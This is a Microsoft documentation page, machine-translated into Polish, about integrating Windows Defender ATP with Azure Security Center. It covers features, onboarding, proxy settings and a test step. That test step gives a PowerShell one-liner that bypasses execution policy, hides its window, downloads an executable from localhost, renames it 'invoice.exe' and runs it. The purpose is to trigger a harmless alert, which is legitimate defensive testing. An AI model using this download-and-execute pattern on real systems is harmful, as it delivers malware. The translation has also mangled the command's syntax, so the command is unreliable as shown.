---
title: Windows Defender Advanced Threat Protection (ATP) z usługą Azure Security Center (publiczna wersja zapoznawcza) | Dokumentacja firmy Microsoft
description: Ten dokument wprowadza integrację między usługą Azure Security Center i usługi Windows Defender ATP.
services: security-center
documentationcenter: na
author: barclayn
manager: MBaldwin
editor: ''
ms.service: security-center
ms.devlang: na
ms.topic: article
ms.tgt_pltfrm: na
ms.workload: na
ms.date: 09/06/2018
ms.author: barclayn
ms.openlocfilehash: f59525d6ff006ebd4560f96b2ca12bea3626a841
ms.sourcegitcommit: ebd06cee3e78674ba9e6764ddc889fc5948060c4
ms.translationtype: MT
ms.contentlocale: pl-PL
ms.lasthandoff: 09/07/2018
ms.locfileid: "44057228"
---
# <a name="windows-defender-advanced-threat-protection-atp-with-azure-security-center-public-preview"></a>Windows Defender Advanced Threat Protection (ATP) z usługą Azure Security Center (publiczna wersja zapoznawcza)

Usługa Azure Security Center jest rozszerzenie oferty chmury obciążenia ochrony platformy (CWPP) dzięki integracji z usługą [usługi Windows Defender ATP](https://www.microsoft.com/WindowsForBusiness/windows-atp).
Ta zmiana zapewnia kompleksowe funkcje do punktu końcowego wykrywania i odpowiedzi (EDR). Umożliwia on wykrywanie nieprawidłowości, wykrywanie ich i reagowanie na zaawansowane ataki na punkty końcowe serwera monitorowane przez usługę ASC.

Usługa Azure Security Center, klienci mogą teraz używać funkcji Windows Defender ATP:

- **Czujniki wykrywanie naruszenia wpis nowej generacji:** czujnik usługi Windows Defender ATP serwerów Windows, które umożliwia zbieranie informacji o szerokiego spektrum zachowań sygnałów umożliwiające wykrywanie zaawansowanych ataków i badania.

- **Wykrywanie naruszenia post na podstawie analizy, oparta na chmurze:** usługi Windows Defender ATP szybko dostosowuje do zmieniających się zagrożeń. Do działania wykorzystuje ona zaawansowanych analiz i danych big data. Rozszerzone dzięki możliwościom usługi Intelligent Security Graph przy użyciu sygnały Windows, platformy Azure i pakietu Office w celu wykrywania nieznanych zagrożeń. Ona alerty z możliwością wykonywania akcji i umożliwia szybkie reagowanie.

- **Analiza zagrożeń**: usługi Windows Defender ATP identyfikuje narzędzia osoba atakująca, technik i procedur i generuje alerty, gdy te są przestrzegane. Korzysta z danych generowanych przez Microsoft łowców, zespoły zabezpieczeń i rozszerzone analizy zagrożeń oferowanych przez partnerów.

Te możliwości są teraz dostępne w usłudze Azure Security Center:

- Automatyczne dołączanie - czujnika zaawansowanej ochrony przed zagrożeniami programu Windows Defender jest automatycznie włączone na serwerach Windows, które są dołączone do usługi ASC

- Jedną taflę szkła w ASC — Windows Defender ATP alerty są dostępne w konsoli usługi ASC

- Szczegółowe badanie machine - ASC klienci mogą uzyskiwać dostęp do konsoli usługi Windows Defender ATP sprawdzać szczegółowe, aby odkryć zakresu naruszenia

![* Rysunek 1 cały obraz wyświetlany podczas badania, w tym alerty wygenerowane przez usługę ASC *](media/security-center-wdatp/image1.png)

Można zbadać alert w usłudze Azure Security Center:

![Rysunek 2 badania — usługa Azure Security Center](media/security-center-wdatp/image2.png)

Możesz badać alertu, przez przestawianie w usłudze Windows Defender ATP. Można przeglądać dodatkowe informacje, takie jak drzewo procesów alertu, wykres zdarzenia i szczegółowe osi czasu, udostępnianie wszystkie zachowania historycznych okres sześciu miesięcy.

![Rysunek 3 badania — usługa Windows Defender ATP](media/security-center-wdatp/image3.png)

## <a name="platform-support"></a>Obsługa platform

Ta funkcja obsługuje wykrywanie w systemie Windows Server 2012 R2 i Windows Server 2016.

Tylko serwery w ramach subskrypcji w warstwie standardowa

## <a name="onboarding-instructions"></a>Instrukcje dołączania

- Jeśli możesz już dołączono wymagane serwery do usługi ASC w warstwie standardowa — żadne działania, ASC podłączone zostaną automatycznie serwerów WDATP.

- Jeśli użytkownik nigdy nie dołączono serwerów do warstwy standardowa usługi ASC warstwy — dołączanie do usługi ASC w zwykły sposób.

- Jeśli została dołączona przez WDATP serwerami:
  - Zapoznaj się z dokumentacją, aby uzyskać wskazówki na [sposób odłączony maszyny server](https://go.microsoft.com/fwlink/p/?linkid=852906).
  - Dołączanie do usługi ASC

## <a name="access-to-wdatp-portal"></a>Dostęp do portalu WDATP

Postępuj zgodnie z instrukcjami [przydzielać użytkownikom dostęp do portalu](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-atp/assign-portal-access-windows-defender-advanced-threat-protection)

## <a name="set-firewall-configuration"></a>Ustaw konfigurację zapory

Jeśli masz serwer proxy lub zapory, która blokuje ruch anonimowe, zgodnie z czujników w usłudze Windows Defender ATP nawiązuje połączenie z kontekstu systemowego, sprawdź, czy anonimowe ruch jest dozwolony; Postępuj zgodnie z instrukcjami [zapewnianie dostępu do adresów URL usługi Windows Defender ATP na serwerze proxy](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-atp/configure-proxy-internet-windows-defender-advanced-threat-protection#enable-access-to-windows-defender-atp-service-urls-in-the-proxy-server)

## <a name="how-can-i-test-the-feature"></a>Jak można przetestować tę funkcję?

 Poniższe kroki, spowoduje wygenerowanie niegroźne alert testowy WDATP.

1. Protokół RDP z jednym z maszyny wirtualne z systemem Windows Server (2012 R2 lub 2016) w subskrypcji i Otwórz okno wiersza polecenia

2. W wierszu polecenia kopiowania, a następnie uruchom poniższe polecenie. Należy pamiętać, że w oknie wiersza polecenia zostanie zamknięte automatycznie.

    -ExecutionPolicy - NoExit **PowerShell.exe obejścia - Nazwa_okna ukryty (modułu System.Net.WebClient New-Object). DownloadFile ("http://127.0.0.1/1.exe", "C:\\testu WDATP test\\invoice.exe"); Rozpocznij proces "C:\\testu WDATP test\\invoice.exe" **

  ![Obraz przedstawiający polecenie powyżej w oknie wiersza polecenia](media/security-center-wdatp/image4.jpeg)

3. W przypadku powodzenia w ciągu kilku minut w ASC i WD zaawansowanej ochrony przed zagrożeniami portalu pojawi się nowy alert.

4. Zapoznaj się z alertu w usłudze Azure Security Center, przejdź do **alerty zabezpieczeń —\> podejrzane wiersz polecenia programu Powershell**

5. Z badania okna, kliknij łącze do przekierowania WDATP portalu

## <a name="next-steps"></a>Kolejne kroki

* [Ustawianie zasad zabezpieczeń w usłudze Azure Security Center](security-center-policies.md) — informacje na temat konfigurowania zasad zabezpieczeń dla subskrypcji i grup zasobów na platformie Azure.
* [Zarządzanie zaleceniami dotyczącymi zabezpieczeń w usłudze Azure Security Center](security-center-recommendations.md) — Dowiedz się, w jaki sposób zalecenia ułatwiają ochronę zasobów platformy Azure.
* [Monitorowanie kondycji zabezpieczeń w usłudze Azure Security Center](security-center-monitoring.md) — informacje o sposobie monitorowania kondycji zasobów platformy Azure.
